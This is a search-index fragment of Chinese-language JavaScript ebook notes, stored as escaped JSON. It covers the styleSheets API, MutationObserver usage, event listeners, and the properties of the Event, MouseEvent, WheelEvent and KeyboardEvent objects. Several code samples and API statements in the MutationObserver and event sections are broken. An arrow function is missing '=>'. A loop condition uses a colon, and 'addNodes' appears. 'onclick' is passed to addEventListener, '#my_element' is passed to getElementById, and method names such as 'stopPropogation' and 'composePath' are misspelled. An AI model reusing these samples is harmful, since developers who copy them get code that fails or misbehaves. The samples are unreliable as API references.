<p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u53c2\u6570\uff0c\u83b7\u53d6\u7684\u5bf9\u8c61\u662f\u52a8\u6001\u53d8\u5316\u7684\u5b9e\u9645\u6e32\u67d3\u5bf9\u8c61\uff08\u53ea\u8bfb\uff09\uff1b\u53ef\u4ee5\u901a\u8fc7\u70b9\u8bed\u6cd5\u83b7\u53d6\u5177\u4f53\u7684\u6837\u5f0f\uff1b\u83b7\u53d6\u7684\u7ed3\u679c\u662f\u7edd\u5bf9\u7684\u8ba1\u7b97\u7ed3\u679c\uff08px rgb\uff09\u9700\u8981\u901a\u8fc7\u5355\u4e2a\u5c5e\u6027\uff08font-size\uff09\u800c\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6font\u7684\u5c5e\u6027\u3002</p> <p>\u754c\u9762\u4e0a\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u83b7\u53d6\u4f2a\u5143\u7d20\u7684\u5b9e\u9645\u6837\u5f0f</p>"},{"location":"ebook-JS-basic/08-DOM/#6stylesheets-api","title":"6\u3001styleSheets API","text":"<p>document.stylesheets \u7f51\u9875\u5168\u90e8\u7684\u6837\u5f0f\u8868\uff08\u5916\u90e8\u6837\u5f0f\u6216\u8005\u5185\u8054\u6837\u5f0f\u7684\u4f2a\u6570\u7ec4\uff09\u6216\u8005\u83b7\u53d6\u5355\u4e00\u5143\u7d20\u7684\u6837\u5f0f\u8868</p> <p>elementNode.sheet \u8fd9\u4e2a\u5bf9\u8c61\u5177\u6709\u5f88\u591a\u5c5e\u6027\uff08title disabled media href...\uff09</p> <p>styleSheet.insertRule('#block { color: white }', 0) \u7ed90\u6761\u6837\u5f0f\u8868\u589e\u52a0\u4e00\u6761\u89c4\u5219</p> <p>styleSheet.deleteRule(1) \u5220\u96641\u6761\u6837\u5f0f\u8868\u7684\u89c4\u5219</p> <p>\u754c\u9762\u6dfb\u52a0\u6837\u5f0f\u8868\u7684\u65b9\u6cd5\uff1a\u6dfb\u52a0style\u8282\u70b9\u6216\u8005link\u8282\u70b9</p>"},{"location":"ebook-JS-basic/08-DOM/#811","title":"8.11 \u53d8\u5316\u89c2\u5bdf\u5668","text":"<p>\u8fd9\u4e2a\u5728\u751f\u4ea7\u4e2d\u6ca1\u6709\u7528\u5230\u8fc7</p>"},{"location":"ebook-JS-basic/08-DOM/#1","title":"1\u3001\u89c2\u5bdf\u5668\u5b9a\u4e49","text":"<p>Mutation(\u53d8\u5316) Observer(\u89c2\u5bdf\u8005)</p> <p>Mutation observer API \u89c2\u5bdf\u5668\uff1a\u53ef\u4ee5\u76d1\u89c6DOM\u8282\u70b9\u7684\u53d8\u52a8\u3002\u8282\u70b9\u5c5e\u6027\u6587\u672c\u7684\u589e\u51cf\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2aAPI\u76d1\u6d4b\u5230\u3002\u548cEvent\u7684\u533a\u522b\u662f\uff0cevent\u662f\u540c\u6b65\u89e6\u53d1\uff08DOM\u53d8\u52a8\u540e\u5c31\u4f1a\u89e6\u53d1\u4e8b\u4ef6\uff09observer\u662f\u5f02\u6b65\u89e6\u53d1\uff0c\u754c\u9762\u4e2d\u7684DOM\u64cd\u4f5c\u5168\u90e8\u505a\u5b8c\u540e\u624d\u89e6\u53d1\u8fd9\u4e2aAPI\uff0c\u800c\u4e14\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u4e8b\u4ef6\u89e6\u53d1\uff08\u62d6\u52a8\u4e8b\u4ef6\u53ef\u80fd\u51e0\u5343\u6b21\uff0c\u6700\u540e\u5728observer\u4e2d\u53ea\u89e6\u53d1\u4e00\u6b21\uff0c\u4f46\u662fevent\u4e2d\u4f1a\u89e6\u53d1\u591a\u6b21\uff09\u603b\u7ed3\u4e00\u4e0b\u5177\u6709\u4e09\u4e2a\u7279\u70b9\uff1a</p> <ul> <li>\u5f02\u6b65\u89e6\u53d1</li> <li>\u907f\u514d\u9891\u7e41\u89e6\u53d1\uff08\u628a\u6240\u6709\u7684\u4e8b\u4ef6\u5c01\u88c5\u5728\u4e00\u4e2a\u6570\u7ec4\u4e2d\u5904\u7406\uff09</li> <li>\u53ef\u4ee5\u9009\u62e9\u6027\u8bb0\u5f55DOM\u53d8\u52a8\u7c7b\u578b</li> </ul>"},{"location":"ebook-JS-basic/08-DOM/#2","title":"2\u3001\u89c2\u5bdf\u5668\u6784\u9020\u51fd\u6570","text":"<p>\u6784\u9020\u51fd\u6570\u521b\u5efa\u89c2\u5bdf\u5668\u5b9e\u4f8b</p> <pre><code>let observer = new MutationObserver((mutations, observer) {\n    // mutations \u662f\u4e8b\u4ef6\u6784\u6210\u7684\u6570\u7ec4\uff0cobserver \u662f\u8fd4\u56de\u7684\u89c2\u5bdf\u5668\u5b9e\u4f8b\uff0c\u6784\u9020\u51fd\u6570\u4f20\u5165\u7684\u53c2\u6570\u662f\u56de\u8c03\u51fd\u6570\n  mutations.forEach((mutation) =&gt; {\n        console.log(mutation);\n  });\n});\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#3","title":"3\u3001\u5b9e\u4f8b\u65b9\u6cd5","text":"<pre><code>let options = {'childList': true, 'Attributes': true, 'characterData': false};\nobserver.observe(div, options);\n// \u89c2\u5bdfdiv\u4e0a\u9762\u7684options\u53d8\u5316\u60c5\u51b5  characterData \u8282\u70b9\u5185\u5bb9\u6216\u8005\u8282\u70b9\u6587\u672c\u7684\u53d8\u5316\n\nlet insertedNodes = [];\nlet observer = new MutationObserver((mutations) =&gt; {\n  mutations.forEach((mutation) =&gt; {\n    for (let i = 0; i : mutation.addedNodes.length; i++) {\n      insertedNodes.push(mutation.addNodes[i]);\n    }\n  });\n  console.log(insertedNodes);\n});\nlet options = { childList: true };\nobserver.observe(document, options);\n// \u6ce8\uff1a\u6559\u7a0b\u4e0aoptions\u7684\u952e\u4e0d\u540c\uff0c\u7b2c\u4e00\u4e2a\u6848\u4f8b\u662f\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u662f\u76f4\u63a5\u7684 childList\uff0c\u5e94\u8be5\u7b2c\u4e00\u4e2a\u6b63\u786e\u3002\n\nobserver.disconnect(); // \u505c\u6b62\u76d1\u542cDOM\u7684\u53d8\u52a8\nlet changes = observer.takeRecords(); // \u4fdd\u5b58\u89c2\u5bdf\u5668\u6ca1\u6709\u5904\u7406\u7684\u5176\u4ed6\u53d8\u52a8(\u5904\u7406\u5230\u7684\u90e8\u5206\u5728\u56de\u8c03\u51fd\u6570\u4e2d\u5b9e\u73b0)\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#4mutationrecord","title":"4\u3001mutationRecord \u5bf9\u8c61","text":"<p>DOM \u53d8\u5316\u4e00\u6b21\u4f1a\u4ea7\u751f\u4e00\u4e2a MutationRecord \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5177\u6709\u5f88\u591a\u5c5e\u6027</p> <pre><code>type target addedNodes removedNodes previousSibling nextSibling oldValue\n</code></pre>"},{"location":"ebook-JS-basic/08-DOM/#5","title":"5\u3001\u4f7f\u7528\u6848\u4f8b","text":"<pre><code>// \u76d1\u542c\u5b50\u5143\u7d20\u7684\u53d8\u52a8\nvar callback = function (records){\n  records.map(function(record){\n    console.log('Mutation type: ' + record.type);\n    console.log('Mutation target: ' + record.target);\n  });\n};\n\nvar mo = new MutationObserver(callback);\n\nvar option = {\n  'childList': true,\n  'subtree': true\n};\n\nmo.observe(document.body, option);\n</code></pre> <p>\u5c5e\u6027\u7684\u53d8\u52a8</p> <pre><code>var callback = function (records) {\n  records.map(function (record) {\n    console.log('Previous attribute value: ' + record.oldValue);\n  });\n};\n\nvar mo = new MutationObserver(callback);\n\nvar element = document.getElementById('#my_element');\n\nvar options = {\n  'attributes': true,\n  'attributeOldValue': true\n}\n\nmo.observe(element, options);\n</code></pre> <p>\u53d6\u4ee3 DOMContentLoaded \u4e8b\u4ef6</p> <pre><code>(function(win){\n  'use strict';\n\n  var listeners = [];\n  var doc = win.document;\n  var MutationObserver = win.MutationObserver || win.WebKitMutationObserver;\n  var observer;\n\n  function ready(selector, fn){\n    // \u50a8\u5b58\u9009\u62e9\u5668\u548c\u56de\u8c03\u51fd\u6570\n    listeners.push({\n      selector: selector,\n      fn: fn\n    });\n    if(!observer){\n      // \u76d1\u542cdocument\u53d8\u5316\n      observer = new MutationObserver(check);\n      observer.observe(doc.documentElement, {\n        childList: true,\n        subtree: true\n      });\n    }\n    // \u68c0\u67e5\u8be5\u8282\u70b9\u662f\u5426\u5df2\u7ecf\u5728DOM\u4e2d\n    check();\n  }\n\n  function check(){\n  // \u68c0\u67e5\u662f\u5426\u5339\u914d\u5df2\u50a8\u5b58\u7684\u8282\u70b9\n    for(var i = 0; i &lt; listeners.length; i++){\n      var listener = listeners[i];\n      // \u68c0\u67e5\u6307\u5b9a\u8282\u70b9\u662f\u5426\u6709\u5339\u914d\n      var elements = doc.querySelectorAll(listener.selector);\n      for(var j = 0; j &lt; elements.length; j++){\n        var element = elements[j];\n        // \u786e\u4fdd\u56de\u8c03\u51fd\u6570\u53ea\u4f1a\u5bf9\u8be5\u5143\u7d20\u8c03\u7528\u4e00\u6b21\n        if(!element.ready){\n          element.ready = true;\n          // \u5bf9\u8be5\u8282\u70b9\u8c03\u7528\u56de\u8c03\u51fd\u6570\n          listener.fn.call(element, element);\n        }\n      }\n    }\n  }\n\n  // \u5bf9\u5916\u66b4\u9732ready\n  win.ready = ready;\n\n})(this);\n\n// \u4f7f\u7528\u65b9\u6cd5\nready('.foo', function(element){\n  // ...\n});\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/","title":"09-Event","text":""},{"location":"ebook-JS-basic/09-Event/#_1","title":"\u7b2c\u4e5d\u7ae0 \u4e8b\u4ef6","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 36232  \u9605\u8bfb73\u5206\u949f</p> <p>2021-11-24 2023-04-11</p>"},{"location":"ebook-JS-basic/09-Event/#91","title":"9.1 \u4e8b\u4ef6\u5bf9\u8c61","text":"<p>\u4e8b\u4ef6\u662f\u7ec4\u4ef6\u95f4\u901a\u4fe1\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u53ef\u4ee5\u7528\u6765\u5f02\u6b65\u7f16\u7a0b\uff0c\u6709\u4e09\u4e2a\u53c2\u6570\uff1a</p> <pre><code>div.addEventListener('onclick', callback, false);\n</code></pre> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7c7b\u578b\uff0c\u5927\u5c0f\u5199\u654f\u611f</li> <li>\u7b2c\u4e8c\u4e2a\u662f\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\uff0c\u53ef\u4ee5\u662f\u533f\u540d\u51fd\u6570\u6216\u8005\u5916\u90e8\u51fd\u6570\u3002</li> <li>\u7b2c\u4e09\u4e2a\u53ef\u9009\u53c2\u6570\u662f\u76d1\u542c\u4e8b\u4ef6\u7684\u9636\u6bb5\u3002\u9ed8\u8ba4\u662ffalse\uff0c\u8868\u793a\u5728\u4e8b\u4ef6\u5192\u6ce1\u9636\u6bb5\u76d1\u542c\u4e8b\u4ef6\uff1btrue \u8868\u793a\u5728\u4e8b\u4ef6\u6355\u83b7\u9636\u6bb5\u76d1\u542c\u3002\u65e0\u8fd4\u56de\u503c\u3002\u7b2c\u4e09\u4e2a\u53c2\u6570\u8fd8\u53ef\u4ee5\u914d\u7f6e{once: true} \u8868\u793a\u51fd\u6570\u53ea\u76d1\u542c\u4e00\u6b21\u4e8b\u4ef6\uff0c\u4e4b\u540e\u81ea\u52a8\u79fb\u9664\u3002\u4e00\u4e2a\u5bf9\u8c61\u4e0a\u7ed1\u5b9a\u4e0d\u540c\u7684\u76d1\u542c\u51fd\u6570\uff0c\u90a3\u4e48\u89e6\u53d1\u6309\u7167\u5148\u540e\u987a\u5e8f\u8fdb\u884c\uff1b\u5982\u679c\u7ed1\u5b9a\u591a\u4e2a\u76f8\u540c\u7684\u76d1\u542c\u51fd\u6570\uff0c\u90a3\u4e48\u53ea\u89e6\u53d1\u4e00\u6b21\u3002</li> </ul> <pre><code>div.removeEventListener('onclick', handleEvent, false);\n</code></pre> <p>\u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\uff1a\u8fd9\u91cc\u7684\u4e09\u4e2a\u53c2\u6570\u5fc5\u987b\u76f8\u540c\uff0c\u624d\u80fd\u79fb\u9664\u4e8b\u4ef6\u76d1\u542c\u3002</p> <pre><code>let e = new Event('click');\ndiv.dispatchEvent(e);\n</code></pre> <p>\u4e8b\u4ef6\u6d3e\u53d1(\u89e6\u53d1)\uff1a\u521b\u5efa\u4e00\u4e2a\u4e8b\u4ef6\u5e76\u89e6\u53d1\u3002\u5982\u679c\u4e0d\u4f20\u53c2\u6570\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JS-basic/09-Event/#92","title":"9.2 \u4e8b\u4ef6\u6a21\u578b","text":"<p>\u76d1\u542c\u51fd\u6570\uff1a\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u6d4f\u89c8\u5668\u76d1\u6d4b\u5230\u4e8b\u4ef6\uff0c\u89e6\u53d1\u76d1\u542c\u51fd\u6570\uff0c\u4e8b\u4ef6\u9a71\u52a8\u7f16\u7a0b\u6a21\u5f0f\uff08event-drived\uff09\u7ed1\u5b9a\u76d1\u542c\u51fd\u6570\u6709\u4e09\u4e2a\u65b9\u6cd5\uff1a</p> <ul> <li> <p>on \u884c\u5185\u7ed1\u5b9a\uff1a <code>&lt;div onclick={(e) =&gt; {console.log(e);}&gt;&lt;/div&gt;</code> \u8fd9\u4e2a\u5728\u4e8b\u4ef6\u5192\u6ce1\u9636\u6bb5\u6267\u884c\uff08\u5b50\u5143\u7d20\u5148\u89e6\u53d1\u4e8b\u4ef6\uff0c\u4e4b\u540e\u5192\u6ce1\u5230\u7236\u5143\u7d20\uff09\uff0c\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u5e94\u4e00\u4e2a\u6267\u884c\u8bed\u53e5\u3002\u6bcf\u6b21\u6267\u884c\u90fd\u9700\u8981\u751f\u6210\u4e00\u4e2a\u5bf9\u5e94\u7684\u533f\u540d\u51fd\u6570\uff0c\u4e0d\u592a\u597d\u3002</p> </li> <li> <p>on \u8282\u70b9\u7ed1\u5b9a\uff1a\u6548\u679c\u548c\u7b2c\u4e00\u4e2a\u76f8\u540c\uff0c\u76d1\u542c\u51fd\u6570\u5185\u5bb9\u53ef\u4ee5\u589e\u591a\uff0c\u9002\u5e94\u4e8e\u7ed1\u5b9a\u4e8b\u4ef6\u5f88\u5c11\u4ee3\u7801\u3002\u5982\u679c\u4e24\u6b21\u7ed1\u5b9a\u4f1a\u8986\u76d6\u524d\u4e00\u4e2a\u51fd\u6570\u3002</p> </li> </ul> <pre><code>window.onload = function () {...}\ndiv.onclick = function(e) {...}\n</code></pre> <ul> <li>addEventListener \u7ed1\u5b9a\u4e8b\u4ef6\u3002\u4e00\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u51fd\u6570\uff0c\u9002\u5e94\u4e8e\u591a\u4e2a\u4e8b\u4ef6\uff0c\u53ef\u4ee5\u89e3\u7ed1\u4e8b\u4ef6\u76d1\u542c\u3002</li> </ul> <p>\u76d1\u542c\u51fd\u6570\u5185\u90e8\u7684this\u6307\u5411\u89e6\u53d1\u4e8b\u4ef6\u7684DOM\u5143\u7d20\uff0c\u901a\u5e38\u4f7f\u7528 event.target.value \u83b7\u53d6DOM\u5143\u7d20\u7684\u503c\u3002</p> <ul> <li> <p>\u4e8b\u4ef6\u4f20\u64ad\uff1a\u4e8b\u4ef6\u7ecf\u5386\u4e09\u4e2a\u9636\u6bb5\uff1a\u4e8b\u4ef6\u6355\u83b7\u9636\u6bb5\uff08\u4e0a\u5230\u4e0b\uff09\u4e8b\u4ef6\u76ee\u6807\u9636\u6bb5\uff08\u5e95\u5c42\u89e6\u53d1\uff09\u4e8b\u4ef6\u5192\u6ce1\u9636\u6bb5\uff08\u4e0b\u5230\u4e0a\uff09</p> </li> <li> <p>\u4e8b\u4ef6\u4ee3\u7406\uff1a\u4e8b\u4ef6\u4ece\u4e0b\u5c42\u5411\u4e0a\u5c42\u5192\u6ce1\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u4e0a\u5c42\u8bbe\u7f6e\u4e8b\u4ef6\u76d1\u542c\uff0c\u7edf\u4e00\u76d1\u542c\u4e0b\u5c42\u7684\u4e8b\u4ef6\u53d8\u5316\uff0c\u5982\u679c\u4e0b\u5c42\u7684\u8282\u70b9\u4e2a\u6570\u53d8\u5316\u4e0d\u4f1a\u5f71\u54cd\u4e0a\u5c42\u4e8b\u4ef6\u7684\u76d1\u542c\u3002\u8fd9\u6837\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5904\u7406\u591a\u4e8b\u4ef6\uff0c\u591a\u5b50\u8282\u70b9\uff0c\u5b50\u8282\u70b9\u53d8\u5316\u7684\u60c5\u51b5\u3002</p> </li> <li> <p>\u963b\u6b62\u4e8b\u4ef6\u5192\u6ce1\uff1astopPropogation\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u963b\u6b62\u4e8b\u4ef6\u4f20\u64ad\uff08\u5411\u4e0a\u5411\u4e0b\u4f20\u64ad\uff09\uff0c\u4f46\u662f\u4e0d\u80fd\u963b\u6b62\u4e8b\u4ef6\u7684\u89e6\u53d1\uff08\u5982\u679c\u4e8b\u4ef6\u5bf9\u5e94\u4e24\u4e2a\u76d1\u542c\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u963b\u6b62\u4e8b\u4ef6\u5192\u6ce1\uff0c\u7b2c\u4e8c\u4e2a\u51fd\u6570\u4ecd\u7136\u53ef\u4ee5\u89e6\u53d1\uff09\u3002\u5982\u679c\u4f7f\u7528 stopImmediatePropogation \u53ef\u4ee5\u963b\u6b62\u540e\u9762\u51fd\u6570\u7684\u89e6\u53d1\u3002</p> </li> </ul>"},{"location":"ebook-JS-basic/09-Event/#93","title":"9.3 \u4e8b\u4ef6\u5bf9\u8c61","text":"<p>Event \u5bf9\u8c61\uff08\u7531Event\u6784\u9020\u51fd\u6570\u521b\u5efa\uff09\u662f\u539f\u751f\u5bf9\u8c61\uff0cEvent\u5b9e\u4f8b\u7ee7\u627f\u81ea\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u6240\u4ee5\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u5bf9\u8c61</p> <pre><code>let e = new Event('look', {'bubbles': true, 'cancelable': false});\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u540d\u79f0(\u53ef\u4ee5\u81ea\u5b9a\u4e49)</p> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5c5e\u6027\uff1a\u53ef\u4ee5\u5411\u4e0a\u5192\u6ce1\uff0c\u4e8b\u4ef6\u4e0d\u53ef\u4ee5\u88ab\u53d6\u6d88</p> <p>\u5c5e\u6027</p> <pre><code>e.bubbles \u4e8b\u4ef6\u662f\u5426\u53ef\u4ee5\u5192\u6ce1(\u9ed8\u8ba4\u4e0d\u4f1a\u5192\u6ce1\uff0c\u9664\u975e\u663e\u793a\u58f0\u660e)\ne.eventPhase \u4e8b\u4ef6\u5904\u4e8e\u4ec0\u4e48\u9636\u6bb5(0-3) \u5bf9\u5e94\u6ca1\u6709\u89e6\u53d1\u3001\u4e8b\u4ef6\u6355\u83b7\u3001\u76ee\u6807\u9636\u6bb5\u3001\u4e8b\u4ef6\u5192\u6ce1\ne.cancelable \u8fd4\u56de\u5e03\u5c14\u503c\uff0c\u5224\u65ad\u4e8b\u4ef6\u53ef\u4ee5\u88ab\u53d6\u6d88\uff0c\u5982\u679c\u662ffalse\uff0ce.preventDefault() \u662f\u65e0\u6548\u7684\uff0c\u5bf9\u4e8e\u4e0d\u786e\u5b9a\u7684\u4e8b\u60c5\u53ef\u4ee5\u5148\u5224\u65ad\uff0c\u540e\u786e\u5b9a\u662f\u5426\u963b\u6b62\u9ed8\u8ba4\u4e8b\u4ef6\u3002\nif (e.cancelable) {\n  e.preventDefault();\n}\ne.cancleBubblt === true \u65f6\uff0c\u7c7b\u4f3c\u4e8e e.cancleBubble() \u65b9\u6cd5\uff0c\u53ef\u4ee5\u963b\u6b62\u4e8b\u4ef6\u5192\u6ce1\u3002\ne.defaultPrevented \u5224\u65ad\u4e8b\u4ef6\u662f\u5426\u6267\u884c\u8fc7 e.preventDefault\ne.target \u4e8b\u4ef6\u539f\u59cb\u89e6\u53d1\u7684\u8282\u70b9(input)\ne.currentTarget \u4e8b\u4ef6\u6b63\u5728\u7ecf\u8fc7\u7684\u8282\u70b9(input\u89e6\u53d1\u540e\uff0c\u4e8b\u4ef6\u5192\u6ce1\u5230\u4e0a\u5c42\u7684div) \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u76d1\u542c\u51fd\u6570\u4f4d\u4e8e\u54ea\u4e2a\u5c42\u7ea7\u7684\u8282\u70b9\uff0c\u53ea\u6709\u4e8b\u4ef6\u7ecf\u8fc7\u8fd9\u4e2a\u8282\u70b9\u65f6\u624d\u4f1a\u89e6\u53d1\u76d1\u542c\u51fd\u6570\uff0c\u6240\u4ee5 currentTarget \u901a\u5e38\u6307\u5411 this ,\u5f53\u524d\u6b63\u5728\u7ecf\u8fc7\u4e8b\u4ef6\ne.type \u4e8b\u4ef6\u7c7b\u578b(look)\ne.timeStamp \u4e8b\u5047\u65f6\u95f4\u6233\uff0c\u83b7\u53d6\u7684\u662f\u4ece\u7f51\u9875\u52a0\u8f7d\u5230\u4e8b\u4ef6\u6267\u884c\u7684\u65f6\u95f4\u95f4\u9694\ne.isTrusted \u4e8b\u4ef6\u662f\u5426\u7531\u771f\u5b9e\u7528\u6237\u4ea7\u751f\u7684(\u4e0d\u662f\u811a\u672c\u4ea7\u751f\u7684)\ne.detail \u8fd4\u56de\u5177\u4f53\u7684\u4e8b\u4ef6\u4fe1\u606f\uff0c\u4f8b\u5982click dbclick \u4e2d\uff0ce.detail \u53ef\u4ee5123\uff0c\u8868\u793a\u70b9\u51fb\u9f20\u6807\u7684\u6b21\u6570\uff1b\u5bf9\u4e8e\u9f20\u6807\u6eda\u52a8\u4e8b\u4ef6\uff0c\u8fd4\u56de\u503c\u662f\u9f20\u6807\u6eda\u52a8\u7684\u8ddd\u79bb(\u8fd9\u4e2a\u53ef\u4ee5\u51fa\u53d1\u754c\u9762\u7f29\u653e\uff0c\u56fe\u7247\u7f29\u653e\u7b49)\n</code></pre> <p>\u5b9e\u4f8b\u65b9\u6cd5</p> <ul> <li>e.preventDefault() \u8fd9\u4e2a\u4e8b\u4ef6\u9700\u8981\u5728 e.cancelable === true \u4e0b\u6267\u884c\uff0c\u53ef\u4ee5\u8fc7\u6ee4\u7528\u6237\u8f93\u5165(\u53ea\u8f93\u5165\u5927\u5199\u6216\u8005\u6570\u5b57\u7b49)\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165\u6570\u5b57\uff0c\u5b9e\u9645\u4e0a\u6709e\u7684\u5b58\u5728\uff0c\u53ef\u4ee5\u8fc7\u6ee4\u6389\u3002</li> <li>e.stopPropogation()</li> <li>e.stopImmediatePropogation() \u963b\u6b62\u5f53\u524d\u4e8b\u4ef6\u548cDOM\u8282\u70b9\u7ed1\u5b9a\u7684\u5176\u4ed6\u4e8b\u4ef6\u5192\u6ce1</li> <li>e.composePath() \u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u4e8b\u4ef6\u5192\u6ce1\u7684\u4e0a\u5c42\u8282\u70b9</li> </ul>"},{"location":"ebook-JS-basic/09-Event/#94","title":"9.4 \u9f20\u6807\u4e8b\u4ef6","text":"<p>\u4e0b\u9762\u7684\u4e8b\u4ef6\u662f MouseEvent \u7684\u5b9e\u4f8b</p> <pre><code>click: \u7528\u6237\u5b8c\u6210 mousedown mouseup \u6700\u540e\u89e6\u53d1 click\ndbclick: mousedown mouseup click dbclick\nmousedown\nmouseup\nmousemove \u89e6\u53d1\u6b21\u6570\u8f83\u591a\uff0c\u6ce8\u610f\u9650\u6d41\nmouseenter-mouseleave \u8fdb\u5165\u5b50\u8282\u70b9\u6216\u8005\u9000\u51fa\u7236\u8282\u70b9\u4e0d\u4f1a\u89e6\u53d1\u4e8b\u4ef6\nmouseover-mouseout \u8fdb\u5165\u5b50\u8282\u70b9\u6216\u8005\u9000\u51fa\u7236\u8282\u70b9\u4f1a\u89e6\u53d1\u4e8b\u4ef6, mouseover \u4f1a\u5728\u5b50\u8282\u70b9\u4e0a\u591a\u6b21\u89e6\u53d1\ncontextmenu \u6309\u4e0b\u53f3\u952e\u65f6(\u53f3\u952e\u83dc\u5355\u51fa\u73b0\u524d)\u89e6\u53d1\nwheel \u6eda\u52a8\u9f20\u6807\n</code></pre> <p>\u6eda\u52a8\u4e8b\u4ef6\u548c\u62d6\u62fd\u4e8b\u4ef6\u4e5f\u662f MouseEvent \u7684\u5b9e\u4f8b\uff0cMouseEvent \u4e8b\u4ef6\u7ee7\u627f\u4e86 Event \u4e8b\u4ef6</p> <p>\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u6784\u9020\u51fd\u6570\u81ea\u5b9a\u4e49\u9f20\u6807\u4e8b\u4ef6</p> <pre><code>let e = new MouseEvent(type, options);\n</code></pre> <p>\u4e0b\u9762\u662f\u6784\u9020\u51fd\u6570\u7684\u53ef\u9009\u5c5e\u6027\uff1a</p> <ul> <li>screenX, screenY, clientX, clientY,</li> <li>ctrlKey, shiftKey, altKey, metaKey\uff08command\u6216\u8005window\u952e\uff09, </li> <li>button(012 \u8868\u793a\u5de6\u952e\u4e2d\u952e\u53f3\u952e)</li> <li>buttons(000 001 010 100 011 \u4ee3\u8868\u591a\u4e2a\u6309\u952e)</li> <li>relatedTarget\uff1a\u8282\u70b9\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u76f8\u5173\u8282\u70b9\uff0c\u9ed8\u8ba4\u4e3anull\u3002mouseenter\u548cmouseover\u4e8b\u4ef6\u65f6\uff0c\u8868\u793a\u9f20\u6807\u521a\u521a\u79bb\u5f00\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\uff1bmouseout\u548cmouseleave\u4e8b\u4ef6\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6b63\u5728\u8fdb\u5165\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002</li> </ul> <p>MouseEvent \u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u9664\u4e86\u4e0a\u9762\u7684\u5c5e\u6027\u8fd8\u5177\u6709</p> <pre><code>movementX, movementY \u5f53\u524d\u4f4d\u7f6e\u4e0e\u4e0a\u4e00\u4e2a mousemove \u4e8b\u4ef6\u7684\u4f4d\u7f6e\u7684\u4f4d\u79fb\noffsetX offsetY \u9f20\u6807\u4f4d\u7f6e\u4e0e\u76ee\u6807\u8282\u70b9\u7684\u76f8\u5bf9\u8ddd\u79bb\npageX, pageY \u9f20\u6807\u4f4d\u7f6e\u4e0e\u754c\u9762\u7684\u76f8\u5bf9\u8ddd\u79bb\n</code></pre> <pre><code>\u9f20\u6807\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u65b9\u6cd5\ne.getModifierState('CapsLock')\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#_2","title":"\u6eda\u8f6e\u4e8b\u4ef6","text":"<p>WheelEvent </p> <pre><code>\u7c7b\u4f3c\u4e8e\u9f20\u6807\u4e8b\u4ef6\uff0c\u4e5f\u5177\u6709\u6784\u9020\u51fd\u6570\u548c\u5bf9\u5e94\u7684\u5c5e\u6027\ndeltaX deltaY deltaZ \u8868\u793a\u6eda\u8f6e\u5728XYZ\u4e09\u4e2a\u65b9\u5411\u7684\u4f4d\u79fb\ndeltaMode \u662f\u4e0a\u9762\u4f4d\u79fb\u7684\u5355\u4f4d\uff0c012 \u8868\u793a\u50cf\u7d20\uff0c\u884c\uff0c\u9875\n</code></pre>"},{"location":"ebook-JS-basic/09-Event/#95","title":"9.5 \u952e\u76d8\u4e8b\u4ef6","text":"<p>keydown keypress keyup \u4e8b\u4ef6</p> <p>\u6309\u4e0b\u952e\u540e\uff0ckeydown keypress (keydown keypress) \u6700\u540e keyup \u529f\u80fd\u952e\u70b9\u51fb\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e09\u4e2a\u4e8b\u4ef6</p> <p>\u6784\u9020\u51fd\u6570 let e = new KeyboardEvent('type', options);</p> <p>key\uff1a\u5b57\u7b26\u4e32\uff0c\u5f53\u524d\u6309\u4e0b\u7684\u952e\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 code\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 location\uff1a\u6574\u6570\uff0c\u5f53\u524d\u6309\u4e0b\u7684\u952e\u7684\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a0\u3002 ctrlKey\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Ctrl \u952e\uff0c\u9ed8\u8ba4\u4e3afalse\u3002 shiftKey\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u6309\u4e0b Shift 